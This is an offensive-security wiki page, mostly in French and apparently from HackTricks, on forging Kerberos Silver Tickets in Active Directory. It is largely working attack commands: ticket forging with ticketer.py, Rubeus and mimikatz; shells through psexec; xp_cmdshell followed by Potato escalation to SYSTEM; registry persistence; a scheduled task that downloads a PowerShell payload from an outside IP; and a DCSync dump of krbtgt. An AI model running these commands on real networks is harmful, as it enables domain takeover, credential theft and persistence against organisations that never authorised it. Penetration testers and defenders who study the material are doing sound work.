# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

L'attaque **Silver Ticket** implique l'exploitation des service tickets dans les environnements Active Directory (AD). Cette méthode repose sur l'**obtention du NTLM hash d'un service account**, comme un compte d'ordinateur, pour forger un Ticket Granting Service (TGS) ticket. Avec ce ticket forgé, un attaquant peut accéder à des services spécifiques sur le réseau, **usurpant l'identité de n'importe quel utilisateur**, visant généralement des privilèges administratifs. Il est souligné que l'utilisation de AES keys pour forger des tickets est plus sûre et moins détectable.

> [!WARNING]
> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
> Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.

Pour la fabrication de tickets, différents outils sont utilisés selon le système d'exploitation :

### Sur Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Sous Windows
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Le service CIFS est mis en évidence comme une cible courante pour accéder au système de fichiers de la victime, mais d'autres services comme HOST et RPCSS peuvent aussi être exploités pour des tâches et des requêtes WMI.

### Exemple : MSSQL service (MSSQLSvc) + Potato to SYSTEM

Si vous avez le NTLM hash (ou l'AES key) d'un compte de service SQL (par ex. sqlsvc), vous pouvez forger un TGS pour le MSSQL SPN et impersonate n'importe quel utilisateur auprès du service SQL. Ensuite, activez xp_cmdshell pour exécuter des commandes en tant que le compte de service SQL. Si ce token possède SeImpersonatePrivilege, enchaînez un Potato pour élever au niveau SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Si le contexte résultant possède SeImpersonatePrivilege (souvent vrai pour les comptes de service), utilisez une variante de Potato pour obtenir SYSTEM :
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Plus de détails sur l'abus de MSSQL et l'activation de xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Aperçu des Potato techniques:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Services disponibles

| Type de service                            | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

En utilisant **Rubeus** vous pouvez **demander tous** ces tickets en utilisant le paramètre :

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Event IDs des Silver tickets

- 4624: Connexion de compte
- 4634: Déconnexion de compte
- 4672: Connexion administrateur

## Persistance

Pour éviter que les machines ne fassent pivoter leur mot de passe tous les 30 jours, définissez `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ou vous pouvez définir `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` sur une valeur supérieure à 30 jours pour indiquer la période de rotation à laquelle le mot de passe de la machine doit être changé.

## Abuser des tickets de service

Dans les exemples suivants, imaginons que le ticket a été récupéré en usurpant le compte administrateur.

### CIFS

Avec ce ticket vous pourrez accéder aux dossiers `C$` et `ADMIN$` via **SMB** (s'ils sont exposés) et copier des fichiers vers une partie du système de fichiers distant en faisant simplement quelque chose comme :
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Vous pourrez également obtenir un shell à l'intérieur de l'hôte ou exécuter des commandes arbitraires en utilisant **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HÔTE

Avec cette permission, vous pouvez générer des tâches planifiées sur des ordinateurs distants et exécuter des commandes arbitraires :
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Avec ces tickets, vous pouvez **exécuter WMI sur le système victime** :
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Consultez **plus d'informations sur wmiexec** dans la page suivante :


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### Hôte + WSMAN (WINRM)

Avec un accès winrm à un ordinateur, vous pouvez **y accéder** et même obtenir un PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Consultez la page suivante pour apprendre **d'autres façons de se connecter à un hôte distant en utilisant winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Notez que **winrm doit être actif et à l'écoute** sur l'ordinateur distant pour y accéder.

### LDAP

Avec ce privilège, vous pouvez dump la base de données du DC en utilisant **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**En savoir plus sur DCSync** sur la page suivante :


{{#ref}}
dcsync.md
{{#endref}}


## Références

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
